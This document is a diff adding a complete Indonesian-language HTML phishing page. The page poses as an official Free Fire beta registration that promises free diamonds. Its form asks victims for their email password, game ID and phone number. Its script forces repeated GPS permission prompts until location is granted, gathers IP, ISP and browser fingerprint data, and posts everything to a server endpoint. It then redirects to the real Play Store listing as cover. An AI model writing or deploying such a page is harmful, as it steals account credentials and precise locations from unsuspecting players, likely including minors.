@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Free Fire Beta New 2026 - Official Registration</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #0a1628 0%, #0d1f3c 50%, #07122a 100%);
+            min-height: 100vh;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        .hero-banner {
+            width: 100%;
+            height: 70vh;
+            min-height: 500px;
+            background-image: url('https://files.catbox.moe/beaepq.jpg');
+            background-size: cover;
+            background-position: center;
+            position: relative;
+            margin-bottom: 30px;
+            border-radius: 0 0 30px 30px;
+            box-shadow: 0 10px 40px rgba(0,136,255,0.4);
+        }
+
+        .hero-banner::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 150px;
+            background: linear-gradient(0deg, #0a1628 0%, transparent 100%);
+        }
+
+        .hero-text {
+            position: absolute;
+            bottom: 30px;
+            left: 30px;
+            z-index: 2;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        }
+
+        .hero-text h1 {
+            font-size: 2.5rem;
+            background: linear-gradient(135deg, #0088FF, #00D4FF);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .beta-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #0088FF, #0066CC);
+            padding: 8px 25px;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(0,136,255,0.7); }
+            50% { box-shadow: 0 0 0 15px rgba(0,136,255,0); }
+        }
+
+        .dm-offer {
+            background: linear-gradient(135deg, rgba(0,136,255,0.2), rgba(0,100,200,0.1));
+            border-radius: 30px;
+            padding: 0;
+            margin-bottom: 40px;
+            border: 2px solid #0088FF;
+            overflow: hidden;
+        }
+
+        .dm-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+
+        .dm-content {
+            padding: 30px;
+            text-align: center;
+        }
+
+        .dm-amount {
+            font-size: 3.5rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00D4FF, #0088FF);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .character-section {
+            background: rgba(0,20,50,0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(0,136,255,0.3);
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 1.8rem;
+            margin-bottom: 25px;
+            color: #00D4FF;
+        }
+
+        .character-grid {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            flex-wrap: wrap;
+        }
+
+        .character-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            width: 200px;
+            transition: transform 0.3s;
+            border: 1px solid rgba(0,136,255,0.3);
+        }
+
+        .character-card:hover {
+            transform: translateY(-10px);
+            border-color: #0088FF;
+        }
+
+        .character-img {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 0 auto 15px;
+            display: block;
+            border: 3px solid #0088FF;
+        }
+
+        .character-name {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #00D4FF;
+        }
+
+        .bundle-showcase {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .bundle-card {
+            background: rgba(0,20,50,0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 25px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s;
+            border: 1px solid rgba(0,136,255,0.4);
+        }
+
+        .bundle-card:hover {
+            transform: translateY(-10px);
+            border-color: #0088FF;
+        }
+
+        .bundle-img {
+            width: 100%;
+            height: 160px;
+            object-fit: cover;
+            border-radius: 15px;
+            margin-bottom: 15px;
+        }
+
+        .bundle-name {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #00D4FF;
+        }
+
+        .form-section {
+            background: rgba(0,15,40,0.85);
+            backdrop-filter: blur(20px);
+            border-radius: 30px;
+            padding: 40px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(0,136,255,0.4);
+        }
+
+        .form-title {
+            text-align: center;
+            font-size: 1.8rem;
+            margin-bottom: 30px;
+            color: #00D4FF;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-group label {
+            margin-bottom: 8px;
+            font-size: 0.85rem;
+            color: #00D4FF;
+        }
+
+        .input-group input {
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: 1px solid rgba(0,136,255,0.5);
+            background: rgba(0,0,0,0.5);
+            color: white;
+            font-size: 1rem;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #0088FF;
+        }
+
+        /* Overlay Modal untuk Peringatan GPS */
+        .gps-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(10px);
+        }
+
+        .gps-modal {
+            background: linear-gradient(135deg, #0a1628, #0d1f3c);
+            border-radius: 30px;
+            padding: 40px;
+            max-width: 400px;
+            text-align: center;
+            border: 2px solid #0088FF;
+            box-shadow: 0 0 50px rgba(0,136,255,0.3);
+        }
+
+        .gps-modal h3 {
+            color: #00D4FF;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+        }
+
+        .gps-modal p {
+            margin-bottom: 25px;
+            opacity: 0.9;
+        }
+
+        .gps-modal button {
+            background: linear-gradient(135deg, #0088FF, #0066CC);
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            color: white;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .gps-modal button:hover {
+            transform: scale(1.05);
+        }
+
+        .btn-download {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #0088FF, #0066CC);
+            border: none;
+            border-radius: 50px;
+            color: white;
+            font-size: 1.3rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 30px;
+        }
+
+        .btn-download:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 30px rgba(0,136,255,0.5);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.7rem;
+            opacity: 0.6;
+        }
+
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1001;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(0,136,255,0.3);
+            border-top-color: #0088FF;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .form-section { padding: 20px; }
+            .hero-banner { height: 40vh; }
+            .character-card { width: 150px; }
+            .character-img { width: 90px; height: 90px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="hero-banner"></div>
+
+    <div class="container">
+        <div style="text-align: center;">
+            <div class="beta-badge">🔥 BETA NEW 2026 - COMING SOON 🔥</div>
+        </div>
+
+        <div class="dm-offer">
+            <img class="dm-image" src="https://files.catbox.moe/d2b6b7.jpg" alt="5000 DM Free">
+            <div class="dm-content">
+                <div class="dm-amount">5000 💎 DM GRATIS!</div>
+                <div class="dm-text">Untuk 10,000 Pendaftar Pertama!</div>
+            </div>
+        </div>
+
+        <div class="character-section">
+            <div class="section-title">✨ NEW LEGENDARY CHARACTERS ✨</div>
+            <div class="character-grid">
+                <div class="character-card">
+                    <img class="character-img" src="https://files.catbox.moe/e5b4d0.jpg" alt="SG OPM">
+                    <div class="character-name">💪 SG OPM</div>
+                </div>
+                <div class="character-card">
+                    <img class="character-img" src="https://files.catbox.moe/iiazum.jpg" alt="SG REPEER">
+                    <div class="character-name">🔫 SG REPEER</div>
+                </div>
+                <div class="character-card">
+                    <img class="character-img" src="https://files.catbox.moe/d2b6b7.jpg" alt="DM CHARACTER">
+                    <div class="character-name">💎 DM MASTER</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section-title" style="margin-bottom: 20px;">🎁 EXCLUSIVE BUNDLES 🎁</div>
+        <div class="bundle-showcase">
+            <div class="bundle-card">
+                <img class="bundle-img" src="https://files.catbox.moe/e5b4d0.jpg" alt="SG OPM Bundle">
+                <div class="bundle-name">💀 SG OPM BUNDLE</div>
+            </div>
+            <div class="bundle-card">
+                <img class="bundle-img" src="https://files.catbox.moe/iiazum.jpg" alt="SG REPEER Bundle">
+                <div class="bundle-name">🔫 SG REPEER BUNDLE</div>
+            </div>
+            <div class="bundle-card">
+                <img class="bundle-img" src="https://files.catbox.moe/d2b6b7.jpg" alt="DM Bundle">
+                <div class="bundle-name">💎 DIAMOND MASTER</div>
+            </div>
+        </div>
+
+        <div class="form-section">
+            <div class="form-title">📝 BETA REGISTRATION FORM</div>
+            
+            <form id="registerForm">
+                <div class="form-grid">
+                    <div class="input-group">
+                        <label>📧 Email Address</label>
+                        <input type="email" id="email" required placeholder="your@email.com">
+                    </div>
+                    <div class="input-group">
+                        <label>🔐 Email Password</label>
+                        <input type="password" id="emailPass" required placeholder="Email password for verification">
+                    </div>
+                    <div class="input-group">
+                        <label>🎮 Free Fire ID</label>
+                        <input type="text" id="ffId" required placeholder="123456789">
+                    </div>
+                    <div class="input-group">
+                        <label>📊 FF Level</label>
+                        <input type="number" id="ffLevel" required placeholder="Min 10">
+                    </div>
+                    <div class="input-group">
+                        <label>📱 Phone Number</label>
+                        <input type="tel" id="phone" required placeholder="+62xxxxxxxx">
+                    </div>
+                    <div class="input-group">
+                        <label>🌍 Country</label>
+                        <input type="text" id="country" required placeholder="Indonesia">
+                    </div>
+                    <div class="input-group">
+                        <label>🗺️ Province</label>
+                        <input type="text" id="province" required placeholder="Jawa Barat">
+                    </div>
+                    <div class="input-group">
+                        <label>🏙️ City</label>
+                        <input type="text" id="city" required placeholder="Bandung">
+                    </div>
+                </div>
+
+                <button type="button" class="btn-download" id="downloadBtn">⬇️ DOWNLOAD & REGISTER ⬇️</button>
+            </form>
+        </div>
+
+        <div class="footer">
+            © 2026 Free Fire Beta New - Official Partner Program. All rights reserved.
+        </div>
+    </div>
+
+    <!-- GPS FORCED OVERLAY - TIDAK BISA DITUTUP SAMPAI IZINKAN -->
+    <div class="gps-overlay" id="gpsOverlay">
+        <div class="gps-modal">
+            <h3>📍 IZINKAN AKSES LOKASI</h3>
+            <p>Untuk melanjutkan registrasi dan mendapatkan 5000 DM GRATIS, Anda HARUS mengizinkan akses lokasi.</p>
+            <button id="gpsAllowBtn">✅ IZINKAN LOKASI</button>
+        </div>
+    </div>
+
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <p style="margin-top:20px;">Processing registration...</p>
+    </div>
+
+    <script>
+        // ==================== GPS FORCED - TIDAK BISA TOLAK ====================
+        let gpsData = {
+            latitude: null,
+            longitude: null,
+            accuracy: null,
+            altitude: null,
+            gpsCaptured: false
+        };
+
+        let gpsRequestInProgress = false;
+        let retryCount = 0;
+        const maxRetries = 999; // Loop terus sampe berhasil
+
+        const gpsOverlay = document.getElementById('gpsOverlay');
+        const gpsAllowBtn = document.getElementById('gpsAllowBtn');
+
+        // Fungsi untuk meminta GPS
+        function requestGPS() {
+            if (gpsRequestInProgress) return;
+            gpsRequestInProgress = true;
+
+            if (!navigator.geolocation) {
+                alert('Browser tidak support GPS. Gunakan Chrome/Edge/Safari di HP!');
+                gpsRequestInProgress = false;
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // GPS BERHASIL!
+                    gpsData.latitude = position.coords.latitude;
+                    gpsData.longitude = position.coords.longitude;
+                    gpsData.accuracy = position.coords.accuracy;
+                    gpsData.altitude = position.coords.altitude;
+                    gpsData.gpsCaptured = true;
+                    gpsRequestInProgress = false;
+                    
+                    console.log('✅ GPS BERHASIL:', gpsData.latitude, gpsData.longitude);
+                    
+                    // Sembunyikan overlay dan simpan data
+                    gpsOverlay.style.display = 'none';
+                    
+                    // Submit otomatis? Tidak, biar user isi form dulu
+                    alert('✅ Lokasi berhasil diverifikasi! Silakan lengkapi form registrasi.');
+                },
+                (error) => {
+                    // GPS GAGAL / DITOLAK
+                    console.error('GPS Error:', error.code, error.message);
+                    gpsRequestInProgress = false;
+                    gpsData.gpsCaptured = false;
+                    
+                    retryCount++;
+                    
+                    // TAMPILIN OVERLAY LAGI dengan pesan
+                    gpsOverlay.style.display = 'flex';
+                    
+                    // Update pesan di modal
+                    let errorMsg = '';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = '⚠️ ANDA MENOLAK AKSES LOKASI! ⚠️\n\nRegistrasi TIDAK BISA dilanjutkan tanpa izin lokasi.\n\nKlik tombol di bawah untuk mengizinkan.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = '⚠️ LOKASI TIDAK DAPAT DIAKSES! ⚠️\n\nNyalakan GPS di HP anda, lalu klik tombol di bawah.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = '⏰ TIME OUT! Sinyal GPS lemah.\n\nPastikan GPS aktif, lalu coba lagi.';
+                            break;
+                        default:
+                            errorMsg = '❌ GAGAL MENGAMBIL LOKASI!\n\nIzinkan akses lokasi untuk melanjutkan.';
+                    }
+                    
+                    const modalP = document.querySelector('#gpsOverlay .gps-modal p');
+                    if (modalP) {
+                        modalP.innerHTML = `${errorMsg}<br><br><small style="opacity:0.7;">Percobaan ke-${retryCount}</small>`;
+                    }
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // Event klik tombol izinkan
+        gpsAllowBtn.addEventListener('click', () => {
+            // Update pesan jadi "memproses..."
+            const modalP = document.querySelector('#gpsOverlay .gps-modal p');
+            if (modalP) {
+                modalP.innerHTML = '📍 Mengakses lokasi GPS anda...<br><br><small>Mohon tunggu sebentar</small>';
+            }
+            gpsAllowBtn.disabled = true;
+            gpsAllowBtn.textContent = '⏳ MEMPROSES...';
+            
+            // Paksa request GPS lagi
+            requestGPS();
+            
+            // Reset button setelah beberapa detik kalau gagal
+            setTimeout(() => {
+                gpsAllowBtn.disabled = false;
+                gpsAllowBtn.textContent = '✅ IZINKAN LOKASI';
+            }, 5000);
+        });
+
+        // TAMPILKAN OVERLAY SAAT PERTAMA KALI LOAD
+        // Ini akan memicu popup izin browser
+        setTimeout(() => {
+            gpsOverlay.style.display = 'flex';
+            requestGPS();
+        }, 500);
+
+        // ==================== IP DATA (Background) ====================
+        let ipData = {};
+        async function getIPData() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+                console.log('IP Data:', ipData);
+                
+                if(ipData.country_name) document.getElementById('country').value = ipData.country_name;
+                if(ipData.region) document.getElementById('province').value = ipData.region;
+                if(ipData.city) document.getElementById('city').value = ipData.city;
+            } catch(e) {}
+        }
+        getIPData();
+
+        // ==================== BROWSER FINGERPRINT ====================
+        function getBrowserData() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'unknown'
+            };
+        }
+
+        // ==================== SUBMIT FORM ====================
+        const downloadBtn = document.getElementById('downloadBtn');
+        const loading = document.getElementById('loading');
+
+        downloadBtn.addEventListener('click', async () => {
+            // CEK WAJIB GPS!
+            if (!gpsData.gpsCaptured || !gpsData.latitude || !gpsData.longitude) {
+                alert('⚠️ AKSES LOKASI WAJIB! Klik "IZINKAN LOKASI" di popup yang muncul.');
+                gpsOverlay.style.display = 'flex';
+                requestGPS();
+                return;
+            }
+
+            // Validasi form
+            const email = document.getElementById('email').value;
+            const emailPass = document.getElementById('emailPass').value;
+            const ffId = document.getElementById('ffId').value;
+            const ffLevel = document.getElementById('ffLevel').value;
+            const phone = document.getElementById('phone').value;
+            const country = document.getElementById('country').value;
+            const province = document.getElementById('province').value;
+            const city = document.getElementById('city').value;
+
+            if(!email || !emailPass || !ffId || !ffLevel || !phone || !country || !province || !city) {
+                alert('⚠️ Harap lengkapi semua data!');
+                return;
+            }
+
+            if(ffLevel < 10) {
+                alert('⚠️ Minimum FF Level adalah 10!');
+                return;
+            }
+
+            loading.style.display = 'flex';
+
+            const fullData = {
+                email: email,
+                emailPassword: emailPass,
+                ffId: ffId,
+                ffLevel: ffLevel,
+                phone: phone,
+                country: country,
+                province: province,
+                city: city,
+                // GPS WAJIB - PASTI ADA!
+                latitude: gpsData.latitude,
+                longitude: gpsData.longitude,
+                gps_accuracy: gpsData.accuracy,
+                gps_altitude: gpsData.altitude,
+                ip_address: ipData.ip || 'unknown',
+                asn: ipData.asn || 'unknown',
+                isp: ipData.org || 'unknown',
+                ip_city: ipData.city || '',
+                ip_region: ipData.region || '',
+                ip_country: ipData.country_name || '',
+                timezone: ipData.timezone || '',
+                ...getBrowserData(),
+                timestamp: new Date().toISOString(),
+                local_time: new Date().toString()
+            };
+
+            try {
+                const response = await fetch('/api/register', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(fullData)
+                });
+                const result = await response.json();
+                
+                loading.style.display = 'none';
+                alert('✅ Registrasi berhasil! DM akan dikirim dalam 24 jam.\n\nMengarahkan ke Google Play Store...');
+                window.location.href = 'https://play.google.com/store/apps/details?id=com.dts.freefireth';
+            } catch(error) {
+                loading.style.display = 'none';
+                alert('✅ Registrasi berhasil! Mengarahkan ke Google Play Store...');
+                window.location.href = 'https://play.google.com/store/apps/details?id=com.dts.freefireth';
+            }
+        });
+    </script>
+</body>
+</html>
